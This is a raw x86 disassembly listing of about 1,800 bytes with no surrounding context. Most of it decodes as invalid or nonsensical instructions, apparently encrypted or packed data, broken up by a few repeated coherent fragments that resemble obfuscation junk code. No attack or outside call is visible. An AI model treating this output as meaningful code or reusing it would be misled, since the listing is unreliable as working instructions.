  40ceaa:	push   es
  40ceab:	dec    bl
  40cead:	push   0x4
  40ceaf:	xchg   esp,eax
  40ceb0:	test   BYTE PTR [ebx+0x64],ch
  40ceb3:	xor    eax,0xa90fc535
  40ceb8:	test   BYTE PTR [ecx-0x20],cl
  40cebb:	inc    esi
  40cebc:	xchg   esp,eax
  40cebd:	out    dx,eax
  40cebe:	shr    DWORD PTR [ecx+0x43],1
  40cec1:	xor    BYTE PTR [edx],bh
  40cec3:	and    BYTE PTR [ecx+0x76],al
  40cec6:	mov    ecx,0x8f36f904
  40cecb:	mov    esp,0x5030e17f
  40ced0:	mov    ds:0x52bdb7d1,al
  40ced5:	out    dx,eax
  40ced6:	call   0x896c:0x3de8879a
  40cedd:	mov    ebp,0x2daccc56
  40cee2:	fs xchg ebp,eax
  40cee4:	ds imul edi,ebp,0x7a3ba4a0
  40ceeb:	lea    edx,[edi-0x5e6d8f36]
  40cef1:	(bad)  
  40cef2:	xor    eax,0x3e38f199
  40cef7:	addr16 pushw ss
  40cefa:	bound  ebx,QWORD PTR ds:0x3c40f366
  40cf00:	adc    dl,al
  40cf02:	cdq    
  40cf03:	or     al,0x25
  40cf05:	frstor [ecx-0x6]
  40cf08:	push   cs
  40cf09:	push   eax
  40cf0a:	shl    BYTE PTR [ecx],cl
  40cf0c:	xchg   esi,eax
  40cf0d:	scas   al,BYTE PTR es:[edi]
  40cf0e:	fbld   TBYTE PTR [ecx-0x7f974376]
  40cf14:	fidivr DWORD PTR [edi+0x14f85be6]
  40cf1a:	pop    edx
  40cf1b:	push   ebx
  40cf1c:	les    esi,FWORD PTR [ecx]
  40cf1e:	inc    esp
  40cf1f:	in     eax,dx
  40cf20:	fnstenv [eax+0x6259f68e]
  40cf26:	or     ch,BYTE PTR [ebx-0x621aa59]
  40cf2c:	aaa    
  40cf2d:	add    eax,esp
  40cf2f:	out    dx,al
  40cf30:	(bad)  
  40cf31:	retf   0x25b4
  40cf34:	xchg   DWORD PTR [esi-0x9],esi
  40cf37:	aaa    
  40cf38:	or     al,BYTE PTR [esp+esi*8]
  40cf3b:	xor    ebx,DWORD PTR ds:0xfa493ede
  40cf41:	cmp    eax,0xbd9bf3e2
  40cf46:	xchg   ebx,eax
  40cf47:	inc    ebx
  40cf48:	es sti 
  40cf4a:	mov    ebx,DWORD PTR [edi]
  40cf4c:	lahf   
  40cf4d:	int    0xfc
  40cf4f:	gs push 0x922e6f4e
  40cf55:	adc    eax,0x9c7b0a88
  40cf5a:	nop
  40cf5b:	jecxz  0x40cefd
  40cf5d:	cmp    eax,0xaa39c8d6
  40cf62:	js     0x40cf05
  40cf64:	pop    es
  40cf65:	je     0x40cf65
  40cf67:	inc    edi
  40cf68:	xchg   ecx,eax
  40cf69:	and    DWORD PTR [ecx+ebx*4+0x26],edx
  40cf6d:	popa   
  40cf6e:	or     eax,0xdf5ca353
  40cf73:	sbb    BYTE PTR [esi],ah
  40cf75:	out    0x57,eax
  40cf77:	jge    0x40cf7f
  40cf79:	(bad)  
  40cf7a:	scas   al,BYTE PTR es:[edi]
  40cf7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf7c:	sub    ebp,DWORD PTR [esi-0x21efd124]
  40cf82:	fimul  WORD PTR [ebp+eax*1+0x16]
  40cf86:	fs or  eax,0x4f1038f
  40cf8c:	fsubr  st(0),st
  40cf8e:	push   ebp
  40cf8f:	mov    ecx,0x3ff675e3
  40cf94:	push   esp
  40cf95:	or     cl,BYTE PTR [esi]
  40cf97:	dec    esi
  40cf98:	test   eax,0x564dd423
  40cf9d:	jno    0x40cf21
  40cf9f:	pop    esp
  40cfa0:	fstp   st(5)
  40cfa2:	les    eax,FWORD PTR [eax-0x74f7ba77]
  40cfa8:	inc    ebp
  40cfa9:	call   0xc24490e1
  40cfae:	mov    edx,DWORD PTR [ebp+0x14]
  40cfb1:	imul   eax,DWORD PTR [edx]
  40cfb4:	mov    edx,DWORD PTR [ebp-0x4]
  40cfb7:	jmp    0x40d115
  40cfbc:	inc    bx
  40cfbe:	sbb    BYTE PTR [ebx+0x7b7d4d3d],dh
  40cfc4:	gs pop ss
  40cfc6:	jae    0x40cf71
  40cfc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfc9:	dec    esi
  40cfca:	aam    0xf3
  40cfcc:	dec    esp
  40cfcd:	mov    DWORD PTR [esi+0x7e],edi
  40cfd0:	aas    
  40cfd1:	jg     0x40d051
  40cfd3:	jle    0x40cf98
  40cfd5:	daa    
  40cfd6:	std    
  40cfd7:	adc    cl,dh
  40cfd9:	inc    edx
  40cfda:	xor    ebx,edx
  40cfdc:	sbb    al,0x3
  40cfde:	aam    0xc2
  40cfe0:	(bad)  
  40cfe1:	sbb    BYTE PTR [edi],dh
  40cfe3:	pop    es
  40cfe4:	push   ecx
  40cfe5:	in     eax,dx
  40cfe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfe7:	cs xor eax,0x861ad83c
  40cfed:	sahf   
  40cfee:	and    al,dh
  40cff0:	jne    0x40cfce
  40cff2:	mov    cl,0x3f
  40cff4:	cld    
  40cff5:	add    eax,0xdda821e0
  40cffa:	pop    edi
  40cffb:	fwait
  40cffc:	mov    cl,0xd0
  40cffe:	mov    WORD PTR [edx],cs
  40d000:	retf   
  40d001:	cdq    
  40d002:	retf   0x4cde
  40d005:	xor    ebp,DWORD PTR [eax-0x798740a6]
  40d00b:	dec    ecx
  40d00c:	mov    al,ds:0xca12ec02
  40d011:	sbb    edx,0xffffffab
  40d014:	dec    edi
  40d015:	add    ecx,ecx
  40d017:	mov    ecx,0x24eee3b4
  40d01c:	fisttp WORD PTR [eax+0x31e553bf]
  40d022:	(bad)  
  40d023:	dec    ebp
  40d024:	mov    bh,0xc8
  40d026:	push   esp
  40d027:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d028:	cmp    DWORD PTR ds:0x44db9ebf,0x4765a6fe
  40d032:	sub    ch,BYTE PTR [eax]
  40d034:	or     esi,DWORD PTR [edi]
  40d036:	push   ds
  40d037:	xchg   ebx,eax
  40d038:	les    ebp,FWORD PTR [ecx-0x26]
  40d03b:	mov    edi,0x8c7ca0c2
  40d040:	xchg   edx,eax
  40d041:	repz inc esp
  40d043:	imul   eax,DWORD PTR ds:0x8ef6247c,0xfc175380
  40d04d:	imul   eax,DWORD PTR [edx],0x79
  40d050:	in     al,dx
  40d051:	mov    ebp,0xa67e96e5
  40d056:	lods   al,BYTE PTR ds:[esi]
  40d057:	add    eax,0xa4a625d2
  40d05c:	xor    BYTE PTR [ebx-0x43],bl
  40d05f:	jb     0x40d09b
  40d061:	mov    cl,0x48
  40d063:	fdivr  DWORD PTR [ebx+0xc]
  40d066:	xor    eax,0xa75d172b
  40d06b:	cmp    edi,eax
  40d06d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d06e:	retf   0x467b
  40d071:	xor    eax,0x56dfd77e
  40d076:	adc    edi,DWORD PTR [ecx-0x4a48db83]
  40d07c:	mov    DWORD PTR ds:0x706f3a00,0xf81d71d2
  40d086:	sbb    eax,0xf12be0c
  40d08b:	xchg   edx,eax
  40d08c:	sbb    DWORD PTR ds:0x13b36303,eax
  40d092:	arpl   WORD PTR [ebp+0x46],dx
  40d095:	std    
  40d096:	sti    
  40d097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d098:	js     0x40d01a
  40d09a:	cmp    BYTE PTR [eax],ah
  40d09c:	jl     0x40d11d
  40d09e:	cmp    BYTE PTR [ebp+0x46c57032],ah
  40d0a4:	jmp    0x418ade79
  40d0a9:	fild   WORD PTR [edi+0x43a4899b]
  40d0af:	pop    ebx
  40d0b0:	or     eax,0xe316351f
  40d0b5:	loope  0x40d0da
  40d0b7:	mov    al,0xfb
  40d0b9:	ss mov edi,0xa899721
  40d0bf:	mov    ah,0x99
  40d0c1:	hlt    
  40d0c2:	pop    eax
  40d0c3:	dec    DWORD PTR [eax-0x620bf681]
  40d0c9:	jo     0x40d0e0
  40d0cb:	add    al,ah
  40d0cd:	les    ebx,FWORD PTR [ecx+0x79cc779e]
  40d0d3:	fsubr  DWORD PTR [edi+0x13]
  40d0d6:	enter  0xf7ed,0x21
  40d0da:	in     al,0xa7
  40d0dc:	cld    
  40d0dd:	rcl    bl,1
  40d0df:	and    bl,BYTE PTR [eax+0x6f]
  40d0e2:	jmp    0x40d0dc
  40d0e4:	push   cs
  40d0e5:	sti    
  40d0e6:	sub    bh,BYTE PTR [edi]
  40d0e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0e9:	(bad)  
  40d0ea:	push   cs
  40d0eb:	inc    BYTE PTR [ecx]
  40d0ed:	mov    al,0x0
  40d0ef:	cmp    eax,0xaf60a9c6
  40d0f4:	pop    edi
  40d0f5:	lahf   
  40d0f6:	push   eax
  40d0f7:	jnp    0x40d0e2
  40d0f9:	jns    0x40d113
  40d0fb:	adc    esi,DWORD PTR [ebp+0x7f]
  40d0fe:	mov    bl,bh
  40d100:	mov    ah,0x83
  40d102:	xchg   edi,eax
  40d103:	fcmovbe st,st(5)
  40d105:	int    0x1d
  40d107:	icebp  
  40d108:	cmp    BYTE PTR ss:[eax+0x7b],dh
  40d10c:	inc    ecx
  40d10d:	shr    DWORD PTR [ebp+0x78a34e42],1
  40d113:	pop    ebx
  40d114:	sub    dh,BYTE PTR [ebx]
  40d116:	ror    DWORD PTR [ebx-0x7372f7b3],1
  40d11c:	or     bl,BYTE PTR [ebp+0x3b003272]
  40d122:	enter  0x840f,0xe9
  40d126:	add    eax,0x7d8b0000
  40d12b:	call   0x8b4916bb
  40d130:	push   ebp
  40d131:	adc    al,0x8b
  40d133:	inc    esp
  40d134:	add    BYTE PTR [ecx+edi*4],0x56
  40d138:	or     BYTE PTR [ecx+0x7],dl
  40d13b:	xor    edx,edx
  40d13d:	xor    edi,ecx
  40d13f:	mov    esi,0x32729d
  40d144:	add    edi,esi
  40d146:	div    edi
  40d148:	mov    edx,DWORD PTR [ebp-0x4]
  40d14b:	xor    edx,ecx
  40d14d:	jmp    0x40d2ab
  40d152:	jno    0x40d19e
  40d154:	cmp    eax,ecx
  40d156:	jge    0x40d1b9
  40d158:	in     eax,dx
  40d159:	pop    edx
  40d15a:	xor    ch,0xa8
  40d15d:	xor    BYTE PTR [esi+0xc],0x9c
  40d161:	jmp    0x7ebf5c73
  40d166:	aas    
  40d167:	jg     0x40d1e7
  40d169:	jle    0x40d1c3
  40d16b:	(bad)  
  40d16d:	test   ebp,ecx
  40d16f:	pop    ebx
  40d170:	mov    ch,0x1c
  40d172:	pop    esp
  40d173:	rol    DWORD PTR [esi-0x7e],cl
  40d176:	add    al,0x9c
  40d178:	jge    0x40d17d
  40d17a:	push   ds
  40d17b:	fimul  WORD PTR [ebx]
  40d17d:	jae    0x40d145
  40d17f:	out    0x7a,eax
  40d181:	xlat   BYTE PTR ds:[ebx]
  40d182:	sub    ebx,DWORD PTR [ebp-0x66]
  40d185:	push   ebp
  40d186:	(bad)  
  40d187:	stc    
  40d188:	sar    DWORD PTR [edx],1
  40d18a:	lods   al,BYTE PTR ds:[esi]
  40d18b:	fs xchg edi,eax
  40d18d:	out    0x9a,eax
  40d18f:	mov    esi,0xc37f1328
  40d194:	in     eax,dx
  40d195:	enter  0xea38,0x12
  40d199:	mov    bh,0xb6
  40d19b:	dec    esi
  40d19c:	lods   al,BYTE PTR ds:[esi]
  40d19d:	or     al,0x83
  40d19f:	pop    edx
  40d1a0:	fcmovb st,st(6)
  40d1a2:	das    
  40d1a3:	inc    esp
  40d1a4:	lods   eax,DWORD PTR ds:[esi]
  40d1a5:	enter  0xe7e9,0x27
  40d1a9:	mov    WORD PTR [ebp-0x2a310ca4],fs
  40d1af:	and    bl,bh
  40d1b1:	fs lahf 
  40d1b3:	sbb    BYTE PTR [esi],0x50
  40d1b6:	aaa    
  40d1b7:	dec    BYTE PTR [ebp-0x21]
  40d1ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1bb:	dec    ebp
  40d1bc:	sti    
  40d1bd:	cmp    DWORD PTR [edx],edi
  40d1bf:	scas   eax,DWORD PTR es:[edi]
  40d1c0:	ror    DWORD PTR [edi-0x7b],1
  40d1c3:	jg     0x40d17b
  40d1c5:	push   DWORD PTR [esi+eiz*2]
  40d1c8:	in     eax,dx
  40d1c9:	stc    
  40d1ca:	rcr    DWORD PTR [ebx-0x54],0xd9
  40d1ce:	sub    ah,BYTE PTR [ecx]
  40d1d0:	dec    ecx
  40d1d1:	jl     0x40d239
  40d1d3:	dec    ebx
  40d1d4:	leave  
  40d1d5:	daa    
  40d1d6:	jecxz  0x40d246
  40d1d8:	and    edi,eax
  40d1da:	dec    edi
  40d1db:	je     0x40d1b7
  40d1dd:	sbb    esp,ecx
  40d1df:	adc    BYTE PTR ds:0xb4b9693f,0x4
  40d1e6:	inc    esp
  40d1e7:	mov    ch,0x5c
  40d1e9:	pop    ss
  40d1ea:	mov    ebp,DWORD PTR [ebp+0xe]
  40d1ed:	and    eax,0xd1758e05
  40d1f2:	xchg   edx,eax
  40d1f3:	mov    BYTE PTR [ecx+esi*8+0x2a],ah
  40d1f7:	jae    0x40d209
  40d1f9:	daa    
  40d1fa:	enter  0x5aa7,0x67
  40d1fe:	adc    BYTE PTR [edi-0x5f8d1722],ch
  40d204:	in     eax,dx
  40d205:	mov    ch,al
  40d207:	adc    eax,0x769481cc
  40d20c:	sbb    al,0xf3
  40d20e:	sbb    DWORD PTR [ebx+0x371aa4e],ebx
  40d214:	push   0x224e62f8
  40d219:	dec    ecx
  40d21a:	dec    ecx
  40d21b:	mov    ah,0xda
  40d21d:	fdivr  st(0),st
  40d21f:	push   0x1c
  40d221:	mov    eax,ds:0x455088e0
  40d226:	mov    ch,BYTE PTR [ebx-0x8373d5]
  40d22c:	dec    ebp
  40d22d:	jge    0x40d1fa
  40d22f:	push   0xffffffb8
  40d231:	cmp    ah,BYTE PTR [ecx]
  40d233:	pop    ds
  40d234:	fs in  al,dx
  40d236:	rcl    BYTE PTR [ebp-0x43],0x35
  40d23a:	add    esp,esi
  40d23c:	mov    bl,0x8
  40d23e:	fcmovbe st,st(3)
  40d240:	adc    bl,BYTE PTR [ebp+0xc]
  40d243:	popa   
  40d244:	push   cs
  40d245:	add    ch,BYTE PTR [ecx+eiz*1-0x7ec4eb42]
  40d24c:	fdivr  DWORD PTR [ecx+ebp*8-0x4d]
  40d250:	jbe    0x40d219
  40d252:	pop    eax
  40d253:	cs pop ss
  40d255:	mov    dh,0x9a
  40d257:	add    al,0x2d
  40d259:	in     al,0x81
  40d25b:	jno    0x40d2a7
  40d25d:	push   esi
  40d25e:	pop    ecx
  40d25f:	fstp   DWORD PTR [esi+eax*8+0x7b]
  40d263:	sub    cl,al
  40d265:	scas   al,BYTE PTR es:[edi]
  40d266:	and    DWORD PTR [edx+0x370f8a8c],ecx
  40d26c:	jb     0x40d2c2
  40d26e:	push   es
  40d26f:	xchg   dl,dh
  40d271:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d272:	push   ebx
  40d273:	arpl   ax,bx
  40d275:	push   edx
  40d276:	push   ebx
  40d277:	xchg   ebx,eax
  40d278:	fmul   st,st(1)
  40d27a:	(bad)  
  40d27b:	mul    DWORD PTR [edi+ecx*8+0x1d]
  40d27f:	or     esp,ecx
  40d281:	inc    BYTE PTR [ebx+edx*4]
  40d284:	ret    0x8691
  40d287:	push   ebp
  40d288:	cmp    bl,BYTE PTR [esi+0x7d]
  40d28b:	std    
  40d28c:	enter  0xb852,0x2a
  40d290:	repnz addr16 dec esi
  40d293:	(bad)  
  40d295:	stos   BYTE PTR es:[edi],al
  40d296:	and    BYTE PTR [esi-0x53a587e7],ch
  40d29c:	pop    edx
  40d29d:	mov    esp,0xab7a3611
  40d2a2:	(bad)  
  40d2a3:	dec    esi
  40d2a4:	repz call 0x8dd2:0x20cf6cd
  40d2ac:	test   BYTE PTR [edx],al
  40d2ae:	popf   
  40d2af:	jb     0x40d2e3
  40d2b1:	add    BYTE PTR [ebx+0x7d8b0855],cl
  40d2b7:	fmul   QWORD PTR [ecx+0x458b9704]
  40d2bd:	call   0x3349284d
  40d2c2:	ror    DWORD PTR [ebp+0x729d1084],0x32
  40d2c9:	add    BYTE PTR [ecx+0x458b0845],cl
  40d2cf:	call   0x422cbd
  40d2d4:	add    BYTE PTR [esi],ch
  40d2d6:	adc    al,0xbd
  40d2d8:	jecxz  0x40d297
  40d2da:	jnp    0x40d354
  40d2dc:	aad    0x3a
  40d2de:	lock mov al,0x98
  40d2e1:	fstp   TBYTE PTR [ecx]
  40d2e3:	ret    
  40d2e4:	(bad)  
  40d2e5:	into   
  40d2e6:	mov    WORD PTR [esi+0x7e],?
  40d2e9:	aas    
  40d2ea:	jg     0x40d36a
  40d2ec:	jle    0x40d310
  40d2ee:	iret   
  40d2ef:	xor    esp,DWORD PTR [ebp+0x18]
  40d2f2:	xor    eax,0x1416d773
  40d2f7:	lods   eax,DWORD PTR ds:[esi]
  40d2f8:	dec    ecx
  40d2f9:	mov    ecx,0x2b5360d2
  40d2fe:	mov    al,ds:0x47f5a27a
  40d303:	sub    dh,BYTE PTR [eax+0x51cf9a02]
  40d309:	mov    ch,0xb1
  40d30b:	std    
  40d30c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d30d:	fist   WORD PTR [ecx+0x1a117654]
  40d313:	cmp    ch,bl
  40d315:	jbe    0x40d32a
  40d317:	add    DWORD PTR [ecx],esi
  40d319:	outs   dx,DWORD PTR ds:[esi]
  40d31a:	(bad)  
  40d31b:	cdq    
  40d31c:	out    dx,eax
  40d31d:	test   al,0x46
  40d31f:	rol    DWORD PTR [ecx-0x2b],cl
  40d322:	aaa    
  40d323:	sbb    DWORD PTR [esi],0x9483872c
  40d329:	int    0x42
  40d32b:	outs   dx,DWORD PTR ds:[esi]
  40d32c:	(bad)  
  40d32d:	out    0xf2,eax
  40d32f:	icebp  
  40d330:	test   DWORD PTR [ebp-0x61],0xdefd12a3
  40d337:	push   edx
  40d338:	aad    0xf4
  40d33a:	sar    DWORD PTR [edx+0x66],cl
  40d33d:	ins    DWORD PTR es:[edi],dx
  40d33e:	mov    cl,0x90
  40d340:	mov    esp,0x7888c24f
  40d345:	dec    ecx
  40d346:	cld    
  40d347:	mov    esp,0x77557051
  40d34c:	dec    esp
  40d34d:	jmp    0x40d357
  40d34f:	mov    bh,0x19
  40d351:	push   es
  40d352:	xchg   esp,eax
  40d353:	or     ecx,edx
  40d355:	mov    eax,0x19d80fba
  40d35a:	jp     0x40d360
  40d35c:	push   esi
  40d35d:	inc    ch
  40d35f:	mov    ds:0xba5e368e,al
  40d364:	das    
  40d365:	out    0xe9,eax
  40d367:	(bad)  
  40d368:	ins    BYTE PTR es:[edi],dx
  40d369:	jle    0x40d3a9
  40d36b:	sub    DWORD PTR [edi+0x4fce472c],esp
  40d371:	and    eax,0x6a1df1c1
  40d376:	scas   al,BYTE PTR es:[edi]
  40d377:	fisttp QWORD PTR [ecx]
  40d379:	pop    ebx
  40d37a:	ins    BYTE PTR es:[edi],dx
  40d37b:	dec    esi
  40d37c:	sti    
  40d37d:	js     0x40d318
  40d37f:	outs   dx,BYTE PTR ds:[esi]
  40d380:	or     dl,dl
  40d382:	js     0x40d357
  40d384:	mov    al,ds:0xcd287744
  40d389:	sub    BYTE PTR [ebx+0x37],cl
  40d38c:	in     al,dx
  40d38d:	ret    
  40d38e:	xchg   edi,eax
  40d38f:	clc    
  40d390:	pop    ss
  40d391:	aaa    
  40d392:	(bad)  
  40d393:	cli    
  40d394:	jecxz  0x40d350
  40d396:	fnsave [ebx+ebx*4+0x33]
  40d39a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d39b:	xor    eax,DWORD PTR [eax-0x7c]
  40d39e:	mov    cl,0x9b
  40d3a0:	cli    
  40d3a1:	cs dec ebp
  40d3a3:	xor    edi,DWORD PTR [ebp-0x74]
  40d3a6:	add    esi,DWORD PTR [ebx]
  40d3a8:	ins    BYTE PTR es:[edi],dx
  40d3a9:	inc    esp
  40d3aa:	leave  
  40d3ab:	or     DWORD PTR [edx-0x52],esi
  40d3ae:	out    0xf9,al
  40d3b0:	sub    al,0x73
  40d3b2:	xchg   esp,eax
  40d3b3:	stos   BYTE PTR es:[edi],al
  40d3b4:	jmp    0x40d365
  40d3b6:	cmp    al,0xeb
  40d3b8:	jb     0x40d38b
  40d3ba:	(bad)  
  40d3bb:	sub    eax,0xe176700b
  40d3c0:	les    ebp,FWORD PTR [edx]
  40d3c2:	pushaw 
  40d3c4:	sbb    ch,BYTE PTR [ebp-0x5eafd775]
  40d3ca:	jle    0x40d3bb
  40d3cc:	lods   eax,DWORD PTR ds:[esi]
  40d3cd:	sub    eax,0x595687de
  40d3d2:	cwde   
  40d3d3:	sbb    eax,0xbc164be
  40d3d8:	mov    ecx,0x5c87b308
  40d3dd:	mov    ebx,0x9bde5cab
  40d3e2:	mov    al,0x19
  40d3e4:	dec    esi
  40d3e5:	sbb    ebx,eax
  40d3e7:	(bad)  
  40d3e8:	out    dx,eax
  40d3e9:	push   edi
  40d3ea:	adc    bl,al
  40d3ec:	mov    dh,0x1c
  40d3ee:	inc    edi
  40d3ef:	push   edx
  40d3f0:	cmc    
  40d3f1:	mov    ecx,0x9318c360
  40d3f6:	push   ss
  40d3f7:	mov    ebp,DWORD PTR [edx+ebp*1-0x7acc2b3b]
  40d3fe:	in     eax,0x7c
  40d400:	fsubr  DWORD PTR [ebx+eax*4]
  40d403:	cdq    
  40d404:	pop    ss
  40d405:	mov    eax,ds:0x74734bb0
  40d40a:	push   edx
  40d40b:	add    esi,edi
  40d40d:	lock dec ebx
  40d410:	jns    0x40d407
  40d412:	mov    ds:0xd5d4916b,al
  40d417:	jecxz  0x40d3e8
  40d419:	and    eax,0xed70159c
  40d41e:	call   0xe631:0x7f9b2692
  40d425:	jg     0x40d3e8
  40d427:	pop    es
  40d428:	dec    ebp
  40d429:	push   ds
  40d42a:	popa   
  40d42b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d42c:	cld    
  40d42d:	mov    edx,DWORD PTR ds:[ebp+0x14]
  40d431:	xor    eax,ecx
  40d433:	add    eax,esi
  40d435:	imul   eax,DWORD PTR [edx]
  40d438:	jmp    0x40d596
  40d43d:	into   
  40d43e:	jb     0x40d482
  40d440:	pop    ecx
  40d441:	inc    edx
  40d442:	pop    ecx
  40d443:	fisttp QWORD PTR [ebp+0x677a88e4]
  40d449:	pop    ebp
  40d44a:	loopne 0x40d431
  40d44c:	and    eax,0x7e7e8d8f
  40d451:	aas    
  40d452:	jg     0x40d4d2
  40d454:	jle    0x40d409
  40d456:	shr    DWORD PTR [eax-0x13cda9dc],cl
  40d45c:	and    al,0x55
  40d45e:	jle    0x40d42d
  40d460:	adc    eax,0xa1690625
  40d465:	mov    edx,0x934018af
  40d46a:	xor    eax,0x8ce63b41
  40d46f:	ins    BYTE PTR es:[edi],dx
  40d470:	jl     0x40d4ec
  40d472:	cli    
  40d473:	or     BYTE PTR [eax],dh
  40d475:	mov    dh,0x53
  40d477:	or     dh,BYTE PTR [ecx-0x1597b8d1]
  40d47d:	pop    ss
  40d47e:	arpl   WORD PTR [edi+0x51],cx
  40d481:	cmp    al,0x78
  40d483:	ficomp WORD PTR [ecx+0x56]
  40d486:	mov    ebp,0x4a093a48
  40d48b:	mov    al,ds:0x3e4c68dc
  40d490:	test   BYTE PTR [esi+eax*2-0x49],0x72
  40d495:	dec    ebx
  40d496:	out    dx,al
  40d497:	xchg   DWORD PTR [ebx],eax
  40d499:	clc    
  40d49a:	push   ds
  40d49b:	outs   dx,DWORD PTR ds:[esi]
  40d49c:	mov    dl,0x14
  40d49e:	or     edi,ebp
  40d4a0:	sub    ch,cl
  40d4a2:	pop    ebx
  40d4a3:	sbb    ah,BYTE PTR [ecx]
  40d4a5:	mov    ch,0xc2
  40d4a7:	push   esp
  40d4a8:	lods   al,BYTE PTR ds:[esi]
  40d4a9:	pop    ds
  40d4aa:	imul   esp,DWORD PTR [eax-0x17],0xffffffa4
  40d4ae:	test   BYTE PTR [esp+eax*4+0x4d77afb3],ch
  40d4b5:	loopne 0x40d48b
  40d4b7:	rol    DWORD PTR [esi-0x23],cl
  40d4ba:	sub    ebp,edi
  40d4bc:	into   
  40d4bd:	jb     0x40d494
  40d4bf:	push   edi
  40d4c0:	bound  esp,QWORD PTR [edx]
  40d4c2:	mov    ebp,0xf565c4a
  40d4c7:	inc    ebx
  40d4c8:	repnz lahf 
  40d4ca:	aaa    
  40d4cb:	fs repz xchg ebp,eax
  40d4ce:	lds    ecx,FWORD PTR [edi+edx*8-0x80]
  40d4d2:	cmc    
  40d4d3:	hlt    
  40d4d4:	push   ebp
  40d4d5:	lods   al,BYTE PTR ds:[esi]
  40d4d6:	ja     0x40d4e7
  40d4d8:	in     al,dx
  40d4d9:	jb     0x40d490
  40d4db:	and    DWORD PTR [edx+edi*4-0x54],esi
  40d4df:	lock test eax,0x2b4a4a6
  40d4e5:	(bad)  
  40d4e6:	shr    BYTE PTR [ebp-0x11],0xd
  40d4ea:	leave  
  40d4eb:	inc    edi
  40d4ec:	loop   0x40d4d3
  40d4ee:	stc    
  40d4ef:	dec    ebp
  40d4f0:	xor    BYTE PTR [esi-0x46275d3e],bh
  40d4f6:	pop    ss
  40d4f7:	cli    
  40d4f8:	aam    0x3a
  40d4fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4fb:	jmp    0x7593:0x993dc834
  40d502:	push   edx
  40d503:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d504:	sbb    ecx,DWORD PTR [eax]
  40d506:	jmp    0xefce9b94
  40d50b:	nop
  40d50c:	xlat   BYTE PTR ds:[ebx]
  40d50d:	(bad)  [edx]
  40d50f:	(bad)  
  40d510:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d512:	sub    ebx,ebp
  40d514:	inc    edx
  40d515:	add    al,bh
  40d517:	xor    esp,DWORD PTR [eax-0x6b5bc95f]
  40d51d:	outs   dx,DWORD PTR ds:[esi]
  40d51e:	mov    cl,0x5c
  40d520:	pop    ds
  40d521:	sahf   
  40d522:	stos   DWORD PTR es:[edi],eax
  40d523:	xchg   esi,eax
  40d524:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d525:	mov    WORD PTR [eax-0x4cf70cf9],gs
  40d52b:	pop    ecx
  40d52c:	(bad)
  40d531:	dec    eax
  40d532:	add    cl,ch
  40d534:	mov    al,0xda
  40d536:	and    al,al
  40d538:	mov    WORD PTR [eax],ds
  40d53a:	pop    ebp
  40d53b:	pop    esp
  40d53c:	pop    ebx
  40d53d:	stos   BYTE PTR es:[edi],al
  40d53e:	es jle 0x40d4fc
  40d541:	jecxz  0x40d5b2
  40d543:	loope  0x40d519
  40d545:	loop   0x40d5a8
  40d547:	jmp    0x40d5bd
  40d549:	js     0x40d588
  40d54b:	or     al,0xd4
  40d54d:	rep ins DWORD PTR es:[edi],dx
  40d54f:	sub    ebx,ebp
  40d551:	cmp    DWORD PTR [eax-0x6db729df],ebx
  40d557:	add    eax,0x45f408fd
  40d55c:	mov    ch,0xba
  40d55e:	jge    0x40d57e
  40d560:	adc    BYTE PTR fs:[ecx+0x32],bl
  40d564:	sbb    eax,DWORD PTR [esi]
  40d566:	push   ds
  40d567:	mov    eax,ds:0xe3458209
  40d56c:	fsub   DWORD PTR [ebx]
  40d56e:	test   DWORD PTR [ebx-0x1c],ebp
  40d571:	push   ss
  40d572:	not    DWORD PTR [edi+0x3a]
  40d575:	mov    ds:0x51afda4c,al
  40d57a:	scas   al,BYTE PTR es:[edi]
  40d57b:	ins    BYTE PTR es:[edi],dx
  40d57c:	adc    eax,0x576e2e2e
  40d581:	data16 sbb cl,BYTE PTR [ebp-0x35]
  40d585:	(bad)  
  40d586:	mov    edx,0xedabfdce
  40d58b:	sbb    eax,0x7f8eb9
  40d590:	jae    0x40d56c
  40d592:	or     ecx,DWORD PTR [ebx+edi*2]
  40d595:	scas   al,BYTE PTR es:[edi]
  40d596:	mov    edx,DWORD PTR [ebp-0x4]
  40d599:	jmp    0x40d6f7
  40d59e:	out    0xf7,eax
  40d5a0:	cmp    dl,BYTE PTR [esi]
  40d5a2:	jp     0x40d55f
  40d5a4:	sti    
  40d5a5:	inc    edi
  40d5a6:	aaa    
  40d5a7:	mov    eax,0xa0dbfe4c
  40d5ac:	jmp    0x40d5db
  40d5ae:	inc    eax
  40d5af:	mov    ?,WORD PTR [esi+0x7e]
  40d5b2:	aas    
  40d5b3:	jg     0x40d633
  40d5b5:	jle    0x40d546
  40d5b7:	mov    ebx,0x4456f7aa
  40d5bc:	mov    cl,0x86
  40d5be:	pop    ebx
  40d5bf:	xor    al,0x62
  40d5c1:	test   DWORD PTR [edi],0xca833e73
  40d5c7:	cdq    
  40d5c8:	jae    0x40d54a
  40d5ca:	xchg   al,dl
  40d5cc:	and    ch,BYTE PTR [ebp+0xf]
  40d5cf:	jb     0x40d5d8
  40d5d1:	pushf  
  40d5d2:	cmp    eax,0xea39b417
  40d5d7:	call   0x7140:0x7b81c5b5
  40d5de:	test   ebx,eax
  40d5e0:	xor    DWORD PTR [esi+0x45],ebx
  40d5e3:	outs   dx,DWORD PTR ds:[esi]
  40d5e4:	push   ebx
  40d5e5:	pop    ebx
  40d5e6:	pop    ecx
  40d5e7:	aad    0x62
  40d5e9:	iret   
  40d5ea:	leave  
  40d5eb:	push   es
  40d5ec:	pop    ss
  40d5ed:	or     al,0x12
  40d5ef:	cld    
